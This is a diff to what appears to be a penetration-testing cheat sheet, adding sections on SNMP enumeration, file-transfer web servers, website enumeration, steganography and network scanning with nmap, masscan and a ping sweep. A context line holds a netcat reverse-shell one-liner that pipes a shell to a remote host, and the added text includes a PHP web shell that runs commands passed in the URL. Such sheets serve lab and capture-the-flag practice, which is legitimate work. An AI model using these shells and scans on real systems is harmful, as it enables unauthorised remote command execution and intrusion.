@@ -560,3 +560,61 @@ target:
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc [IP] [port] >/tmp/f
 ```
 
+## SNMP
+```
+snmpget -v 1 -c public [IP]
+snmpwalk -v 1 -c public [IP]
+snmpbulkwalk -v2c -c public -Cn0 -Cr10 [IP]
+```
+
+## Web Server
+
+##### Web Server to Transfer Files
+```
+python -m SimpleHTTPServer 80
+```
+
+##### Use wget to Return Information from Website
+```
+wget -v [IP]
+```
+
+##### Enumeration of Website
+```
+nikto -host [IP]
+dirb [IP]
+burpsuite
+```
+
+##### php URL Mod Reverse Shell
+script: `<?php system ($_GET['cmd']); ?>`
+append URL: `?cmd=[command] &`
+
+## Stegonography
+`steghide`
+
+## Scanning
+
+##### nmap
+`nmap [options] [IP]`
+`-sV` service/version info
+`-Pn` ignore host discovery
+`-O` OS guessing
+`-sC` run scripts
+`-p` ports
+IP Formats: `10.10.10.0/24` or `10.10.10.1,10,20`
+Port Formats: `80,135,445` or `1-1000`
+
+##### masscan
+`masscan [options] [IP]`
+`--rate` speed to run (1-2.5mil)
+
+##### pingsweep
+```
+for i in {1..254}; do ping -c 1 X.X.X.$i | grep "bytes from"; done
+```
+
+##### sl.exe
+`sl.exe [options] [IP]`
+`-b` port banners
+`-v` verbose
